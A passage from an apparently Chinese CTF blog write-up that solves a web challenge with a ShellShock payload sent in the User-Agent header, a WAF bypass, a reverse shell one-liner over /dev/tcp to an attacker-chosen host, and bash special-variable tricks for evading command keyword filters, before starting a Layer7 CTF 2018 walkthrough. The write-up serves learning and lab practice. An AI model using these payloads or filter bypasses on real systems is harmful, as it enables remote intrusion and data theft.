</span></span></span><span class=line><span class=cl><span class=err>            echo &#39;&lt;img src=&#34;cat-flag.png&#34; alt=&#34;cat flag&#34;&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>            break;
</span></span></span><span class=line><span class=cl><span class=err>        default:
</span></span></span><span class=line><span class=cl><span class=err>            printf(&#39;%s: command not found&#39;, htmlentities($cmd));
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>接下来我们就可以利用<code>ls.php</code>来找<code>flag</code>了，因为<code>ls.php</code>没什么过滤，所以用<code>func=ls&amp;file=../../../</code>可以发现根目录下的文件</p><p><img src=https://blogpic.zdy.one/img/20190610008571.jpg loading=lazy></p><p>接下来就是考虑怎么去读了，<code>man.php</code>因为有<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>限制得比较死，<code>untar.php</code>貌似只有<code>tar -tvf</code>并没有什么用处，只有<code>cmd.php</code>给出了一个比较不太寻常的<code>env</code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到<code>ShellShock</code>漏洞，并且在<code>index.php</code>中发现有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$black_list</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;\/flag&#39;</span><span class=p>,</span> <span class=s1>&#39;\(\)\s*\{\s*:;\s*\};&#39;</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$black_list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$a</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$black_list</span> <span class=k>as</span> <span class=nv>$b</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>$b</span><span class=s2>/&#34;</span><span class=p>,</span> <span class=nv>$a</span><span class=p>)</span> <span class=o>===</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>fuck</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$b</span><span class=s2> detected! exit now.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>waf</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_SERVER</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>===</span> <span class=s1>&#39;HTTP_&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$key</span><span class=s2>=</span><span class=si>$val</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>关键就在<code>putenv</code>函数，由于<code>ShellShock</code>漏洞 padyload 需要参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>env <span class=nv>x</span><span class=o>=</span><span class=s1>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class=s2>&#34;echo this is a test&#34;</span> 
</span></span></code></pre></td></tr></table></div></div><p>我们就可以利用<code>putenv</code>实现参数传递，直接设置<code>User-agent: () { :;}; echo 222222</code>，发现被 waf</p><p><img src=https://blogpic.zdy.one/img/20190610000803.jpg loading=lazy></p><p>分析 waf 结合漏洞成因，我们可以在最后的<code>};</code>中间添加一个空格绕过，设置<code>User-Agent: () { :;} ; echo 222222</code>，成功发现输出 22222 ，我们也可以使用<code>() { _; } >_[$($())] { whoami; }</code>这个 payload</p><p><img src=https://blogpic.zdy.one/img/20190610002148.jpg loading=lazy></p><p>发现当前用户为<code>www-data</code>，而我们之前发现根目录<code>flag</code>的权限为<code>-r-------- 1 flag root 37 Jan 9 2018 flag</code>，所以不能直接读取，但是有一个<code>flag-reader</code>与<code>flag-reader.c</code>的文件，这应该是题目提示了。因为<code>index.php</code>又把<code>flag</code>关键字屏蔽了，我们也不能直接读取<code>flag-reader.c</code>，但是我们这里可以利用通配符读取，例如使用<code>fla*.c</code></p><p>使用<code>() { _; } >_[$($())] { cat /fla*.c; }</code>得到<code>flag-reader.c</code>源码</p><p><img src=https://blogpic.zdy.one/img/20190610006944.jpg loading=lazy></p><p>Flag-reader.c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;syscall.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buff</span><span class=p>[</span><span class=mi>4096</span><span class=p>],</span> <span class=n>rnd</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>val</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nf>syscall</span><span class=p>(</span><span class=n>SYS_getrandom</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Not enough random</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>setuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>seteuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>alarm</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>val</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>rnd</span><span class=p>,</span> <span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kt>int</span> <span class=n>s</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=n>s</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Can not open file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Wrong response</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>使用<code>bash -c "sh >& /dev/tcp/your ip/port 0>&amp;1" </code>直接反弹 shell</p><p>运行<code>flag-reader</code></p><p><img src=https://blogpic.zdy.one/img/20190610008222.jpg loading=lazy></p><p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就<code>write(1, "Wrong response\n", 16);</code>&mldr;</p><p>然而我在回弹 shell 之后，利用<code>/tmp</code>可写的权限，貌似有点小问题，一旦<code>cat /tmp/zedd</code>，链接就断掉了，无奈只能找其他文件夹，发现<code>/run/lock</code>与<code>/var/tmp</code>均可读可写，使用<code>/flag-reader flag > /run/lock/zedd &lt; /run/lock/zedd</code>写入 flag</p><p>反弹 shell 使用<code>cat</code>非常容易断掉，最好使用执行的方式，最后得到 flag</p><p><img src=https://blogpic.zdy.one/img/20190610001695.jpg loading=lazy></p><h2 id=上篇的解释与补充>上篇的解释与补充</h2><h3 id=特殊变量>特殊变量</h3><p>这里再对上篇进行一定的补充与解释。</p><h4 id=n>$n</h4><div class=table-wrapper><table><thead><tr><th>变量</th><th>含义</th></tr></thead><tbody><tr><td>$0</td><td>当前脚本的文件名</td></tr><tr><td>$n</td><td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第二个参数是$2(0&lt;n&lt;9)</td></tr><tr><td>${n}</td><td>9&lt;n时需要加上大括号</td></tr></tbody></table></div><p>例如，脚本文件如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;File Name: </span><span class=nv>$0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$2</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>执行脚本文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>File Name: ./test.sh
</span></span><span class=line><span class=cl>First Parameter : Hello
</span></span><span class=line><span class=cl>Second Parameter : Zedd
</span></span></code></pre></td></tr></table></div></div><p>而当没有参数的时候，<code>$n</code>就为空，所以我们可以用<code>cat /fl$1ag</code>这样绕过关键字过滤，并且在 bash 环境下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$0</span>
</span></span><span class=line><span class=cl>bash
</span></span></code></pre></td></tr></table></div></div><p>所以我们可以使用这样的 payload ，可以用在 bash 这个关键字过滤但是有需要用到 bash 的情况下，前提是环境用的是 bash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=o>{</span>printf,<span class=s2>&#34;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&#34;</span><span class=o>}</span><span class=p>|</span><span class=nv>$0</span>
</span></span><span class=line><span class=cl>flag<span class=o>{</span>xxx<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=ifs>$IFS</h4><p>IFS(Internal Field Seprator) ，内部域分隔符，Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p><p>而 IFS 是一种 set 变量，当 shell 处理"命令替换"和"参数替换"时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$IFS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$IFS</span><span class=s2>&#34;</span> <span class=p>|</span> od -b
</span></span><span class=line><span class=cl><span class=m>0000000</span> <span class=m>040</span> <span class=m>011</span> <span class=m>012</span> <span class=m>012</span>
</span></span><span class=line><span class=cl><span class=m>0000004</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以看到直接输出IFS是看不到的，把它转化为二进制就可以看到了，&ldquo;040"是空格，&ldquo;011"是Tab，&ldquo;012"是换行符&rdquo;\n&rdquo; 。最后一个 012 是因为 echo 默认是会换行的。</p><h4 id=heading>$?</h4><p>上个命令的退出状态，或函数的返回值。退出状态是一个数字，一般情况下，大部分命令执行成功会返回0，失败返回1。不过，也有一些命令返回其他值，表示不同类型的错误。</p><h4 id=heading-1>$</h4><p>当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$$</span>
</span></span><span class=line><span class=cl><span class=m>75576</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=heading-2>$#</h4><p>传递给脚本或函数的参数个数。</p><p>脚本文件内容：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Total Number of Parameters : </span><span class=nv>$#</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>执行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>Total Number of Parameters : <span class=m>2</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=与>$*与$@</h4><p>都是传递给脚本或函数的所有参数。</p><p>脚本文件内容：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$@</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$*</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>执行命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>Quoted Values: Hello Zedd
</span></span><span class=line><span class=cl>Quoted Values: Hello Zedd
</span></span></code></pre></td></tr></table></div></div><p>它们不被双引号(&rdquo; &ldquo;)包含时，都以"1"&ldquo;2&rdquo; … &ldquo;$n&rdquo; 的形式输出所有参数。</p><p>但是当它们被双引号(&rdquo; &ldquo;)包含时，"∗&ldquo;会将所有的参数作为一个整体，以"1 2…n"的形式输出所有参数；&rdquo;@&ldquo;会将各个参数分开，以"1&rdquo; &ldquo;2&rdquo;…&ldquo;n&rdquo; 的形式输出所有参数。</p><h3 id=内置变量绕过>内置变量绕过</h3><p>上篇其实提到了一点<a class=link href=https://zeddyu.github.io/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 target=_blank rel=noopener>内置变量绕过</a>，但是讲的也不并不多，只是大概提了一下。这里再给一些常用的 bash 内置的环境变量</p><h4 id=bash>$BASH</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$BASH</span>
</span></span><span class=line><span class=cl>/usr/local/bin/bash
</span></span></code></pre></td></tr></table></div></div><p>返回 bash 二进制文件的路径</p><h4 id=home>$HOME</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nv>$HOME</span>
</span></span><span class=line><span class=cl>bash: /Users/zedd: Is a directory
</span></span></code></pre></td></tr></table></div></div><p>返回当前用户所属目录</p><h4 id=pwd>$PWD</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PWD</span>
</span></span><span class=line><span class=cl>/
</span></span></code></pre></td></tr></table></div></div><p>显示当前目录</p><h4 id=oldpwd>$OLDPWD</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$OLDPWD</span>
</span></span><span class=line><span class=cl>/Users/zedd/Desktop/
</span></span></code></pre></td></tr></table></div></div><p>返回上次所在目录</p><h4 id=path>$PATH</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin
</span></span></code></pre></td></tr></table></div></div><p>环境变量<code>$PATH</code></p><h4 id=ps1>$PS1</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS1</span>
</span></span><span class=line><span class=cl><span class=se>\s</span>-<span class=se>\v\$</span>
</span></span></code></pre></td></tr></table></div></div><p>看到的命令行主要提示</p><h4 id=ps2>$PS2</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS2</span>
</span></span><span class=line><span class=cl>&gt;
</span></span></code></pre></td></tr></table></div></div><p>额外输入的辅助提示，表示为<code>></code>，<code>$PS3</code>是 Shell 脚本中使用<code>select</code>时的提示符，显示为空，这里就不再单独列举了</p><h4 id=ps4>$PS4</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS4</span>
</span></span><span class=line><span class=cl>+
</span></span></code></pre></td></tr></table></div></div><p>与<code>set -x</code>配合用来修改跟踪输出的前缀，显示为<code>+</code></p><h3 id=举个>举个🌰</h3><h4 id=layer7-ctf-2018>Layer7 CTF 2018</h4><p>可以访问https://cat.canhack.me/这个在线地址</p><h4 id=题目描述>题目描述</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This service provides read the file.
</span></span><span class=line><span class=cl>https://cat.canhack.me/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This challenge was published in the Layer7 CTF in 2018.
</span></span></code></pre></td></tr></table></div></div><h4 id=writeup>WriteUp</h4><p>点进去发现有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>b</span><span class=p>&gt;</span>Usage<span class=p>&lt;/</span><span class=nt>b</span><span class=p>&gt;</span>: Please enter the parameter like as in <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;/?file=test.txt&#34;</span><span class=p>&gt;</span>this<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.
</span></span></code></pre></td></tr></table></div></div><p>跟进得到<code>test.txt</code>的内容</p><p><img src=https://blogpic.zdy.one/img/20190610006888.jpg loading=lazy></p><p>猜测为文件包含，尝试直接读取<code>flag</code>被<code>waf</code>，直接读取<code>https://cat.canhack.me/?file=index.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
